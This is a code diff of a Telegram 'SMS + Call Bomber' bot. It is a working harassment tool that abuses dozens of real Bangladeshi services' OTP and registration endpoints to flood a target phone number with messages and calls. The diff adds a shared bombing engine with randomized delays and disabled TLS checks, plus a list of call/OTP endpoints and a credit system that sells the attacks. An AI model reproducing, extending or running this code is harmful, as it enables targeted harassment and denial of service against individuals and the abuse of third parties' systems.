@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-Standalone SMS Bomber Bot (67 APIs)
-- Deployable on Railway
+Unified SMS + Call Bomber Bot (Telegram)
+- SMS: 67 APIs (পুরোনো)
+- Call/OTP: Daraz requestOtp API
 """
 
 import os
@@ -16,19 +17,16 @@ from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ========== CONFIG ==========
-# ★★★ সংশোধন: সঠিকভাবে এনভায়রনমেন্ট ভেরিয়েবল থেকে টোকন নেওয়া ★★★
 BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("TELEGRAM_TOKEN")
 if not BOT_TOKEN:
-    raise ValueError("❌ BOT_TOKEN or TELEGRAM_TOKEN environment variable not set!")
+    raise ValueError("❌ BOT_TOKEN or TELEGRAM_TOKEN not set!")
 
 ADMIN_ID = int(os.getenv("ADMIN_ID", "1967494059"))
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "RobiEntertainment")
-
 DB_PATH = os.path.join(os.path.dirname(__file__), "bomber_database.db")
 
-# ========== 67 APIS (পুরোনো + নতুন) ==========
-WORKING_APIS = [
-    # ---- পুরোনো ১৯টি ----
+# ========== 67 SMS APIS (আগের লিস্ট) ==========
+SMS_APIS = [
     {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
     {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
     {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
@@ -99,6 +97,15 @@ WORKING_APIS = [
     {"name": "FoodPanda", "method": "POST", "url": "https://foodpanda.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
 ]
 
+# ========== CALL / OTP APIS (পরের API - Daraz) ==========
+CALL_APIS = [
+    # Daraz - আসল OTP সেন্ড করে (আপনি যেটা চেয়েছেন)
+    {"name": "Daraz OTP", "method": "POST", "url": "https://member.daraz.com.bd/user/api/requestOtp", "body": {"phone": "{phone}", "type": "LOGIN"}},
+    # বাড়তি ২টি কল OTP (চাইলে যোগ করতে পারেন)
+    {"name": "Pathao OTP", "method": "POST", "url": "https://api.pathao.com/api/v1/otp/request", "body": {"phone": "{phone}"}},
+    {"name": "FoodPanda OTP", "method": "POST", "url": "https://foodpanda.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
+]
+
 # ========== LOGGING ==========
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -132,7 +139,7 @@ async def init_db():
             await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
             await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
             await db.commit()
-            logger.info("✅ Bomber database initialized")
+            logger.info("✅ Database initialized")
     except Exception as e:
         logger.error(f"Database init error: {e}")
 
@@ -170,9 +177,118 @@ async def track_api_usage(api_name, user_id, success):
 
 # ========== KEYBOARDS ==========
 def main_keyboard():
-    return ReplyKeyboardMarkup([["💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats"]], resize_keyboard=True)
+    return ReplyKeyboardMarkup([
+        ["💣 SMS Bomber", "📞 Call Bomber"],
+        ["👤 My Profile", "🎁 Redeem Code"],
+        ["📊 My Stats"]
+    ], resize_keyboard=True)
+
 def back_keyboard():
     return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)
+
+# ========== COMMON BOMBER ENGINE ==========
+async def run_bomber(update, context, api_list, mode_name):
+    user_id = update.effective_user.id
+    async with aiosqlite.connect(DB_PATH) as db:
+        async with db.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)) as cur:
+            row = await cur.fetchone()
+            if not row or row[0] < 1:
+                await update.message.reply_text(f"❌ Insufficient credits! Contact @{ADMIN_USERNAME}", reply_markup=main_keyboard())
+                return
+    context.user_data['bomber_mode'] = mode_name
+    context.user_data['api_list'] = api_list
+    await update.message.reply_text(
+        f"💣 Enter target (11 digits):\nExample: `018XXXXXXXX`",
+        parse_mode="Markdown", reply_markup=back_keyboard()
+    )
+    context.user_data['state'] = 'bomber_number'
+
+async def bomber_number(update, context):
+    number = update.message.text.strip()
+    if not number.isdigit() or len(number) != 11:
+        await update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=back_keyboard())
+        return
+    context.user_data['bomber_number'] = number
+    context.user_data['state'] = 'bomber_amount'
+    api_list = context.user_data.get('api_list', [])
+    await update.message.reply_text(
+        f"✅ {number}\n💥 Enter amount (1-20 per API):\n📊 Total APIs: {len(api_list)} × amount",
+        parse_mode="Markdown", reply_markup=back_keyboard()
+    )
+
+async def bomber_amount(update, context):
+    user_id = update.effective_user.id
+    number = context.user_data.get('bomber_number')
+    api_list = context.user_data.get('api_list', [])
+    mode_name = context.user_data.get('bomber_mode', 'SMS')
+    
+    try:
+        amount = int(update.message.text.strip())
+        if amount < 1 or amount > 20:
+            await update.message.reply_text("❌ 1-20 only!", reply_markup=back_keyboard())
+            return
+    except ValueError:
+        await update.message.reply_text("❌ Enter number!", reply_markup=back_keyboard())
+        return
+    if not number or not api_list:
+        await update.message.reply_text("❌ Error!", reply_markup=main_keyboard())
+        context.user_data.clear(); return
+
+    total_apis = len(api_list)
+    total_sms = total_apis * amount
+    msg = await update.message.reply_text(f"⏳ {mode_name} Bombing {number}...")
+
+    success_count = failed_count = 0
+    api_results = []
+
+    ssl_context = ssl.create_default_context()
+    ssl_context.check_hostname = False
+    ssl_context.verify_mode = ssl.CERT_NONE
+    connector = aiohttp.TCPConnector(ssl=ssl_context)
+
+    async with aiohttp.ClientSession(connector=connector) as session:
+        for i, api in enumerate(api_list, 1):
+            api_success = api_failed = 0
+            for j in range(amount):
+                try:
+                    body = replace_phone(api['body'], number)
+                    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
+                    await asyncio.sleep(random.uniform(1.0, 2.0))  # ডেলয় বাড়ানো
+                    if api['method'] == 'POST':
+                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
+                            text = await resp.text()
+                            if check_success(text, resp.status):
+                                api_success += 1; success_count += 1
+                            else:
+                                api_failed += 1; failed_count += 1
+                    else:
+                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
+                            if resp.status in [200, 201, 202, 204]:
+                                api_success += 1; success_count += 1
+                            else:
+                                api_failed += 1; failed_count += 1
+                except Exception:
+                    api_failed += 1; failed_count += 1
+                if j == amount - 1:
+                    await track_api_usage(api['name'], user_id, api_success > 0)
+                total_done = (i-1)*amount + (j+1)
+                if total_done % 10 == 0 or total_done == total_sms:
+                    try:
+                        await msg.edit_text(f"⏳ {mode_name} Bombing...\n✅ {success_count} ❌ {failed_count}\n{total_done}/{total_sms}")
+                    except: pass
+            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
+
+    async with aiosqlite.connect(DB_PATH) as db:
+        await db.execute("UPDATE users SET balance = balance - 1, total_bombing = total_bombing + 1 WHERE user_id=?", (user_id,))
+        await db.commit()
+
+    top = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
+    top_text = "\n".join([f"{i+1}. {a['name']}: ✅{a['success']}" for i,a in enumerate(top) if a['success']>0]) or "❌ No success"
+    await msg.edit_text(
+        f"✅ Done!\n📱 {number}\n📡 {total_apis}\n💥 {total_sms}\n✅ {success_count} ❌ {failed_count}\n📊 {round((success_count/total_sms)*100,2)}%\n\n🏆 Top 10:\n{top_text}",
+        reply_markup=main_keyboard()
+    )
+    context.user_data.clear()
 
 # ========== HANDLERS ==========
 async def start(update, context):
@@ -182,7 +298,7 @@ async def start(update, context):
                          (user.id, user.username or user.first_name))
         await db.commit()
     await update.message.reply_text(
-        f"🔥 Welcome {user.first_name}!\n🆔 ID: `{user.id}`\n💰 Balance: 10\n📡 APIs: {len(WORKING_APIS)}",
+        f"🔥 Welcome {user.first_name}!\n🆔 ID: `{user.id}`\n💰 Balance: 10\n📡 SMS APIs: {len(SMS_APIS)}\n📞 Call APIs: {len(CALL_APIS)}",
         parse_mode="Markdown", reply_markup=main_keyboard()
     )
 
@@ -204,7 +320,7 @@ async def stats(update, context):
             row = await cur.fetchone()
     if row:
         await update.message.reply_text(
-            f"📊 Stats\n💰 {row[0]}\n💣 {row[1]}\n📡 APIs: {len(WORKING_APIS)}",
+            f"📊 Stats\n💰 {row[0]}\n💣 {row[1]}\n📡 SMS APIs: {len(SMS_APIS)}\n📞 Call APIs: {len(CALL_APIS)}",
             reply_markup=main_keyboard()
         )
 
@@ -233,102 +349,13 @@ async def redeem_process(update, context):
     await update.message.reply_text(f"🎉 +{amount} credits!", reply_markup=main_keyboard())
     context.user_data.clear()
 
-async def bomber(update, context):
-    user_id = update.effective_user.id
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)) as cur:
-            row = await cur.fetchone()
-            if not row or row[0] < 1:
-                await update.message.reply_text(f"❌ Insufficient credits! Contact @{ADMIN_USERNAME}", reply_markup=main_keyboard())
-                return
-    await update.message.reply_text(
-        "💣 Enter target (11 digits):\nExample: `018XXXXXXXX`",
-        parse_mode="Markdown", reply_markup=back_keyboard()
-    )
-    context.user_data['state'] = 'bomber_number'
+# SMS Bomber
+async def sms_bomber(update, context):
+    await run_bomber(update, context, SMS_APIS, "SMS")
 
-async def bomber_number(update, context):
-    number = update.message.text.strip()
-    if not number.isdigit() or len(number) != 11:
-        await update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=back_keyboard())
-        return
-    context.user_data['bomber_number'] = number
-    context.user_data['state'] = 'bomber_amount'
-    await update.message.reply_text(
-        f"✅ {number}\n💥 Enter amount (1-20 per API):\n📊 Total: {len(WORKING_APIS)} × amount",
-        parse_mode="Markdown", reply_markup=back_keyboard()
-    )
-
-async def bomber_amount(update, context):
-    user_id = update.effective_user.id
-    number = context.user_data.get('bomber_number')
-    try:
-        amount = int(update.message.text.strip())
-        if amount < 1 or amount > 20:
-            await update.message.reply_text("❌ 1-20 only!", reply_markup=back_keyboard())
-            return
-    except ValueError:
-        await update.message.reply_text("❌ Enter number!", reply_markup=back_keyboard())
-        return
-    if not number:
-        await update.message.reply_text("❌ Error!", reply_markup=main_keyboard())
-        context.user_data.clear(); return
-
-    total_apis = len(WORKING_APIS)
-    total_sms = total_apis * amount
-    msg = await update.message.reply_text(f"⏳ Bombing {number}...")
-
-    success_count = failed_count = 0
-    api_results = []
-
-    ssl_context = ssl.create_default_context()
-    ssl_context.check_hostname = False
-    ssl_context.verify_mode = ssl.CERT_NONE
-    connector = aiohttp.TCPConnector(ssl=ssl_context)
-
-    async with aiohttp.ClientSession(connector=connector) as session:
-        for i, api in enumerate(WORKING_APIS, 1):
-            api_success = api_failed = 0
-            for j in range(amount):
-                try:
-                    body = replace_phone(api['body'], number)
-                    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
-                    await asyncio.sleep(random.uniform(0.8, 1.5))
-                    if api['method'] == 'POST':
-                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
-                            text = await resp.text()
-                            if check_success(text, resp.status):
-                                api_success += 1; success_count += 1
-                            else:
-                                api_failed += 1; failed_count += 1
-                    else:
-                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
-                            if resp.status in [200, 201, 202, 204]:
-                                api_success += 1; success_count += 1
-                            else:
-                                api_failed += 1; failed_count += 1
-                except Exception:
-                    api_failed += 1; failed_count += 1
-                if j == amount - 1:
-                    await track_api_usage(api['name'], user_id, api_success > 0)
-                total_done = (i-1)*amount + (j+1)
-                if total_done % 10 == 0 or total_done == total_sms:
-                    try:
-                        await msg.edit_text(f"⏳ Bombing...\n✅ {success_count} ❌ {failed_count}\n{total_done}/{total_sms}")
-                    except: pass
-            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("UPDATE users SET balance = balance - 1, total_bombing = total_bombing + 1 WHERE user_id=?", (user_id,))
-        await db.commit()
-
-    top = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
-    top_text = "\n".join([f"{i+1}. {a['name']}: ✅{a['success']}" for i,a in enumerate(top) if a['success']>0]) or "❌ No success"
-    await msg.edit_text(
-        f"✅ Done!\n📱 {number}\n📡 {total_apis}\n💥 {total_sms}\n✅ {success_count} ❌ {failed_count}\n📊 {round((success_count/total_sms)*100,2)}%\n\n🏆 Top 10:\n{top_text}",
-        reply_markup=main_keyboard()
-    )
-    context.user_data.clear()
+# Call Bomber
+async def call_bomber(update, context):
+    await run_bomber(update, context, CALL_APIS, "Call/OTP")
 
 async def handle_message(update, context):
     text = update.message.text
@@ -336,7 +363,9 @@ async def handle_message(update, context):
         await update.message.reply_text("🏠 Main", reply_markup=main_keyboard())
         context.user_data.clear(); return
     if text == "💣 SMS Bomber":
-        await bomber(update, context); return
+        await sms_bomber(update, context); return
+    if text == "📞 Call Bomber":
+        await call_bomber(update, context); return
     if text == "👤 My Profile":
         await profile(update, context); return
     if text == "🎁 Redeem Code":
@@ -354,24 +383,22 @@ async def handle_message(update, context):
     else:
         await update.message.reply_text("❌ Use buttons.", reply_markup=main_keyboard())
 
-# ========== MAIN (সংশোধিত) ==========
+# ========== MAIN ==========
 def main():
     print("="*50)
-    print("💣 SMS BOMBER BOT (UPDATED – 50+ APIs)")
-    print(f"✅ APIs Loaded: {len(WORKING_APIS)}")
+    print("💣 UNIFIED SMS + CALL BOMBER BOT")
+    print(f"✅ SMS APIs Loaded: {len(SMS_APIS)}")
+    print(f"✅ Call APIs Loaded: {len(CALL_APIS)}")
     print(f"👑 Admin ID: {ADMIN_ID}")
     print(f"📁 Database: {DB_PATH}")
     print("="*50)
 
-    # ডেটাবেস ইনিশিয়ালাইজ
     asyncio.run(init_db())
 
-    # বট অ্যাপ্লিকেশন তৈরি
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    # পোলিং শুরু
     print("✅ Bot is running...")
     app.run_polling()
 
